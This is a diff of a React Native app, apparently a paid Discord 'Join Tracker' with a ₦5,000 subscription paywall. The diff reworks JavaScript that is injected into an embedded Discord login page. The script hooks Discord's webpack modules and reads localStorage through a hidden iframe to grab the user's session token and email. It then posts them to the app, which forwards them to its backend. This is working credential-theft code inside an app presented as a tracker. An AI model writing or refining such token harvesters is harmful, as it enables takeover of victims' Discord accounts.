@@ -44,51 +44,59 @@ export default function App() {
   (function() {
     function capture() {
       try {
-        // 1. TRY THE "WEBPACK" HOOK (Grabbing Token + Email)
+        let token = null;
+        let email = null;
+
+        // 1. ADVANCED WEBPACK SEARCH (For Token & Real Email)
         const webpack = window.webpackChunkdiscord_app;
         if (webpack) {
           const m = webpack.push([[Symbol()], {}, (e) => e]);
-          let token, email;
           for (const i in m.c) {
             const exp = m.c[i].exports;
             if (exp && exp.default) {
+              // Get Token
               if (exp.default.getToken) token = exp.default.getToken();
-              if (exp.default.getCurrentUser) email = exp.default.getCurrentUser().email;
+              
+              // Get Email from UserStore or CurrentUser
+              if (exp.default.getEmail) email = exp.default.getEmail();
+              if (!email && exp.default.getCurrentUser) {
+                const user = exp.default.getCurrentUser();
+                if (user && user.email) email = user.email;
+              }
             }
             if (token && email) break;
           }
-          if (token && token.length > 20) {
-            window.ReactNativeWebView.postMessage(JSON.stringify({
-              type: 'TOKEN_DATA', 
-              token: token, 
-              email: email || "user@discord.com"
-            }));
-            return true;
-          }
         }
 
-        // 2. TRY THE "IFRAME RESTORATION" HOOK (Your original fallback)
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        const storage = iframe.contentWindow.localStorage;
-        const token = storage.getItem('token');
-        if (token) {
-          const clean = token.replace(/"/g, '');
+        // 2. IFRAME FALLBACK (For Token only)
+        if (!token) {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          const storage = iframe.contentWindow.localStorage;
+          const rawToken = storage.getItem('token');
+          if (rawToken) token = rawToken.replace(/"/g, '');
+        }
+
+        // 3. FINAL VALIDATION & SEND
+        if (token && token.length > 20) {
           window.ReactNativeWebView.postMessage(JSON.stringify({
             type: 'TOKEN_DATA', 
-            token: clean, 
-            email: "user@discord.com" 
+            token: token, 
+            email: email || "user@discord.com" 
           }));
           return true;
         }
       } catch (e) {}
       return false;
     }
-    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
+
+    // Check every 1 second to give Discord time to load the UserStore
+    const timer = setInterval(() => {
+      if (capture()) clearInterval(timer);
+    }, 1000);
   })();
 `;
-
   useEffect(() => {
     registerForNotifications();
     loadSavedUser();
@@ -119,7 +127,7 @@ export default function App() {
       if (message.type === "TOKEN_DATA" && message.token) {
         setShowWebView(false);
         await sendTokenToBackend(message.token, message.email);
-      } 
+      }
       // Fallback for old style messages
       else if (message.type === "TOKEN" && message.data) {
         setShowWebView(false);
@@ -166,7 +174,11 @@ export default function App() {
       const data = await res.json();
       if (Array.isArray(data)) {
         setIsSubscribed(true);
-        if (lastSeenId.current && data.length > 0 && data[0].id !== lastSeenId.current) {
+        if (
+          lastSeenId.current &&
+          data.length > 0 &&
+          data[0].id !== lastSeenId.current
+        ) {
           triggerNotification(data[0]);
         }
         if (data.length > 0) lastSeenId.current = data[0].id;
@@ -212,13 +224,17 @@ export default function App() {
   const handleLogout = async () => {
     Alert.alert("Reset App", "Logout of tracker?", [
       { text: "Cancel", style: "cancel" },
-      { text: "Reset Everything", style: "destructive", onPress: async () => {
-        await AsyncStorage.clear();
-        setIsLoggedIn(false);
-        setMyUserId(null);
-        setMoves([]);
-        setShowWebView(false);
-      }}
+      {
+        text: "Reset Everything",
+        style: "destructive",
+        onPress: async () => {
+          await AsyncStorage.clear();
+          setIsLoggedIn(false);
+          setMyUserId(null);
+          setMoves([]);
+          setShowWebView(false);
+        },
+      },
     ]);
   };
 
@@ -243,11 +259,15 @@ export default function App() {
   const renderMove = ({ item }) => (
     <View style={styles.moveItem}>
       <View style={styles.headerRow}>
-        <Text style={styles.expert}>👤 {item.action.split(" ")[1] || "Member"}</Text>
+        <Text style={styles.expert}>
+          👤 {item.action.split(" ")[1] || "Member"}
+        </Text>
         <Text style={styles.serverTag}>{item.server}</Text>
       </View>
       <Text style={styles.actionText}>Joined the server</Text>
-      <Text style={styles.timeText}>{new Date(item.timestamp).toLocaleTimeString()}</Text>
+      <Text style={styles.timeText}>
+        {new Date(item.timestamp).toLocaleTimeString()}
+      </Text>
     </View>
   );
 
@@ -255,11 +275,16 @@ export default function App() {
     return (
       <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
         <View style={styles.webViewHeader}>
-          <TouchableOpacity onPress={() => setPaystackUrl(null)}><Text style={{ color: "red" }}>Cancel</Text></TouchableOpacity>
+          <TouchableOpacity onPress={() => setPaystackUrl(null)}>
+            <Text style={{ color: "red" }}>Cancel</Text>
+          </TouchableOpacity>
           <Text style={{ fontWeight: "bold" }}>Paystack Secure</Text>
           <View style={{ width: 50 }} />
         </View>
-        <WebView source={{ uri: paystackUrl }} onNavigationStateChange={handlePaystackNavigation} />
+        <WebView
+          source={{ uri: paystackUrl }}
+          onNavigationStateChange={handlePaystackNavigation}
+        />
       </SafeAreaView>
     );
   }
@@ -268,7 +293,9 @@ export default function App() {
     return (
       <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
         <View style={styles.webViewHeader}>
-          <TouchableOpacity onPress={() => setShowWebView(false)}><Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text></TouchableOpacity>
+          <TouchableOpacity onPress={() => setShowWebView(false)}>
+            <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
+          </TouchableOpacity>
           <Text style={{ fontWeight: "bold" }}>Connect to Discord</Text>
           <View style={{ width: 50 }} />
         </View>
@@ -283,7 +310,10 @@ export default function App() {
         />
         <View style={styles.statusFooter}>
           <ActivityIndicator size="small" color="#5865F2" />
-          <Text style={styles.statusText}> Capturing Token Automatically...</Text>
+          <Text style={styles.statusText}>
+            {" "}
+            Capturing Token Automatically...
+          </Text>
         </View>
       </SafeAreaView>
     );
@@ -295,7 +325,10 @@ export default function App() {
         <View style={styles.loginContainer}>
           <Text style={styles.loginEmoji}>🚀</Text>
           <Text style={styles.title}>Join Tracker</Text>
-          <TouchableOpacity style={styles.loginButton} onPress={() => setShowWebView(true)}>
+          <TouchableOpacity
+            style={styles.loginButton}
+            onPress={() => setShowWebView(true)}
+          >
             <Text style={styles.buttonText}>Connect Discord Account</Text>
           </TouchableOpacity>
         </View>
@@ -306,24 +339,41 @@ export default function App() {
               <Text style={styles.loginEmoji}>🔒</Text>
               <Text style={styles.title}>Access Locked</Text>
               <Text style={styles.subtitle}>Your subscription has ended.</Text>
-              <TouchableOpacity style={styles.loginButton} onPress={handlePayment}>
+              <TouchableOpacity
+                style={styles.loginButton}
+                onPress={handlePayment}
+              >
                 <Text style={styles.buttonText}>Renew Access (₦5,000)</Text>
               </TouchableOpacity>
-              <TouchableOpacity style={{ marginTop: 25 }} onPress={handleLogout}><Text style={{ color: "#999" }}>Logout</Text></TouchableOpacity>
+              <TouchableOpacity
+                style={{ marginTop: 25 }}
+                onPress={handleLogout}
+              >
+                <Text style={{ color: "#999" }}>Logout</Text>
+              </TouchableOpacity>
             </View>
           ) : (
             <>
               <View style={styles.headerBar}>
                 <Text style={styles.title}>Live Feed</Text>
-                <TouchableOpacity onPress={handleLogout}><Text style={{ color: "#5865F2", fontWeight: "bold" }}>Reset</Text></TouchableOpacity>
+                <TouchableOpacity onPress={handleLogout}>
+                  <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
+                    Reset
+                  </Text>
+                </TouchableOpacity>
               </View>
               <FlatList
                 data={moves}
                 keyExtractor={(item) => item.id}
                 renderItem={renderMove}
                 refreshing={refreshing}
-                onRefresh={() => { setRefreshing(true); fetchMoves(); }}
-                ListEmptyComponent={<Text style={styles.empty}>Waiting for activity...</Text>}
+                onRefresh={() => {
+                  setRefreshing(true);
+                  fetchMoves();
+                }}
+                ListEmptyComponent={
+                  <Text style={styles.empty}>Waiting for activity...</Text>
+                }
               />
             </>
           )}
@@ -335,22 +385,85 @@ export default function App() {
 
 const styles = StyleSheet.create({
   container: { flex: 1, padding: 20, backgroundColor: "#f9f9f9" },
-  webViewHeader: { height: 60, flexDirection: "row", justifyContent: "space-between", alignItems: "center", paddingHorizontal: 20, borderBottomWidth: 1, borderBottomColor: "#eee" },
-  loginContainer: { flex: 1, justifyContent: "center", alignItems: "center", padding: 30 },
-  paywallContainer: { flex: 1, justifyContent: "center", alignItems: "center", padding: 30 },
+  webViewHeader: {
+    height: 60,
+    flexDirection: "row",
+    justifyContent: "space-between",
+    alignItems: "center",
+    paddingHorizontal: 20,
+    borderBottomWidth: 1,
+    borderBottomColor: "#eee",
+  },
+  loginContainer: {
+    flex: 1,
+    justifyContent: "center",
+    alignItems: "center",
+    padding: 30,
+  },
+  paywallContainer: {
+    flex: 1,
+    justifyContent: "center",
+    alignItems: "center",
+    padding: 30,
+  },
   loginEmoji: { fontSize: 80, marginBottom: 10 },
-  headerBar: { flexDirection: "row", justifyContent: "space-between", alignItems: "center", marginTop: 40, marginBottom: 20 },
+  headerBar: {
+    flexDirection: "row",
+    justifyContent: "space-between",
+    alignItems: "center",
+    marginTop: 40,
+    marginBottom: 20,
+  },
   title: { fontSize: 26, fontWeight: "bold" },
-  subtitle: { fontSize: 16, color: "#666", textAlign: "center", marginBottom: 30 },
-  loginButton: { backgroundColor: "#5865F2", padding: 18, borderRadius: 15, width: "100%" },
-  buttonText: { color: "#fff", textAlign: "center", fontWeight: "bold", fontSize: 16 },
-  moveItem: { backgroundColor: "#fff", padding: 15, marginBottom: 10, borderRadius: 12, elevation: 2 },
+  subtitle: {
+    fontSize: 16,
+    color: "#666",
+    textAlign: "center",
+    marginBottom: 30,
+  },
+  loginButton: {
+    backgroundColor: "#5865F2",
+    padding: 18,
+    borderRadius: 15,
+    width: "100%",
+  },
+  buttonText: {
+    color: "#fff",
+    textAlign: "center",
+    fontWeight: "bold",
+    fontSize: 16,
+  },
+  moveItem: {
+    backgroundColor: "#fff",
+    padding: 15,
+    marginBottom: 10,
+    borderRadius: 12,
+    elevation: 2,
+  },
   headerRow: { flexDirection: "row", justifyContent: "space-between" },
   expert: { fontWeight: "bold", color: "#5865F2" },
-  serverTag: { fontSize: 10, color: "#777", backgroundColor: "#eee", paddingHorizontal: 6, paddingVertical: 2, borderRadius: 10 },
+  serverTag: {
+    fontSize: 10,
+    color: "#777",
+    backgroundColor: "#eee",
+    paddingHorizontal: 6,
+    paddingVertical: 2,
+    borderRadius: 10,
+  },
   actionText: { marginTop: 8, fontSize: 15, color: "#333" },
   timeText: { fontSize: 11, color: "#999", marginTop: 5 },
   empty: { textAlign: "center", marginTop: 50, color: "#999" },
-  statusFooter: { flexDirection: "row", alignItems: "center", justifyContent: "center", padding: 20, backgroundColor: "#fff" },
-  statusText: { fontSize: 13, color: "#5865F2", marginLeft: 10, fontWeight: "500" },
+  statusFooter: {
+    flexDirection: "row",
+    alignItems: "center",
+    justifyContent: "center",
+    padding: 20,
+    backgroundColor: "#fff",
+  },
+  statusText: {
+    fontSize: 13,
+    color: "#5865F2",
+    marginLeft: 10,
+    fontWeight: "500",
+  },
 });
